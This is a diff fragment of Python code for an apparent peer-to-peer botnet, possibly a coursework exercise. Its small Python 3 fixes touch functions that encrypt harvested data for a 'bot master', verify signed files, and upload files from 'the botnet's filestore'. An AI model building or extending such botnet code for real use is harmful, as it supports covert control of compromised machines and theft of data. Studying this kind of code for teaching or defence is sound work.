@@ -20,7 +20,7 @@ def save_valuable(data):
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
 
-    f = open("master_bot_public_key.pem", "r")
+    f = open("master_bot_public_key.pem", "rb")
     public_key = RSA.importKey(f.read())
     f.close()
 
@@ -55,7 +55,7 @@ def verify_file(f):
 
     #https://www.dlitz.net/software/pycrypto/api/2.6/Crypto.Signature.PKCS1_v1_5-module.html
 
-    key_file = open("master_bot_public_key.pem", "r")
+    key_file = open("master_bot_public_key.pem", "rb")
     key = RSA.importKey(key_file.read())
     key_file.close()
     signature = f[:512]
@@ -105,7 +105,7 @@ def p2p_upload_file(sconn, fn):
         print("That file doesn't exist in the botnet's filestore")
         return
     print("Sending %s via P2P" % fn)
-    sconn.send(fn)
+    sconn.send(bytes(fn, "ascii"))
     sconn.send(filestore[fn])
 
 def run_file(f):
